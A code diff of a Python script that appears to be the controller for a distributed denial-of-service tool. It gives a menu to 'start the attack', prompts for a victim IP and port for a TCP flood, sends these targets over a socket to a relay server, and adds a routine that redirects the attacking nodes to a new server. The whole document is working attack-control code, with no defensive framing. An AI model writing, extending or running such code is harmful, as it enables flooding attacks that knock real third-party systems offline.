@@ -2,6 +2,13 @@ import socket
 import time
 
 
+def stop_and_recconect(s):
+    print("stopping the attack")
+    newServerIP = str(input("enter the IP of the new Server: "))
+    s.send('x'.encode())
+    s.send(newServerIP.encode())
+
+
 def show_menu():
     print('|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|')
     print('|    Do you want to start the attack?   |')
@@ -47,26 +54,27 @@ if __name__ == '__main__':
         while True:
 
             attack = str(input(':'))
-            if attack == '1':
-                print('Enter the target IP adddress XXX.XXX.XXX.XXX')
-                victimIP = str(input(':'))  # Walidować?
-                est_connection(s)
-                s.send(str(victimIP).encode())
-                print("attack is in motion")
-                print("press 'x' to stop the attack")
-                stopattack = str(input(':'))
-                if stopattack == 'x':
-                    print("stopping the attack")
-                    newServerIP = str(input("enter the IP of the new Server: "))
-                    s.send('x'.encode())
-                    s.send(newServerIP.encode())
-
-
-            elif attack == '2':
-                est_connection(s)
-                # send 2 -> run tcp flood
-            else:
+            if attack != '1' and attack != '2':
+                print("Wrong number\nplease try again")
                 continue
+
+            s.send(attack.encode())
+
+            print('Enter the target IPv4 adddress XXX.XXX.XXX.XXX')
+            victimIP = str(input(':'))  # Walidować?
+            if attack == '2':
+                victimPort = str(input('Port\n:'))
+            est_connection(s)
+
+            s.send(str(victimIP).encode())
+            if attack == '2':
+                s.send(victimPort.encode())
+
+            print("attack is in motion")
+
+            print("press 'x' to stop the attack")
+            stopattack = str(input(':'))
+            if stopattack == 'x':
+                stop_and_recconect(s)
+
             time.sleep(20)
-            # s.send('2'.encode())
-            # data = s.recv(1024)
